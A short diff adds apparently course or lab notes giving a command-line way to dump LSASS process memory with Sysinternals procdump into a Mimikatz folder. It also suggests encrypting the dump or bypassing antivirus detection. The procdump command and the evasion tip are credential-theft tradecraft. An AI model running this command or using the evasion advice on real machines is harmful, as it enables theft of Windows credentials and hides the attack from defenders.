@@ -1,0 +1,14 @@
+This is an alternative way to do it to the GUI that we did inside of 
+GUI.txt
+
+Here is how we do it:
+
+(make sure you have it, then navigate to it.)
+
+cd c:\Tools\SysinternalsSuite
+
+c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump
+
+Note that the dump process is writing to disk. Dumping the LSASS process is a known technique used by adversaries. Thus, AV products may flag it as malicious. In the real world, you may be more creative and write code to encrypt or implement a method to bypass AV products.
+
+
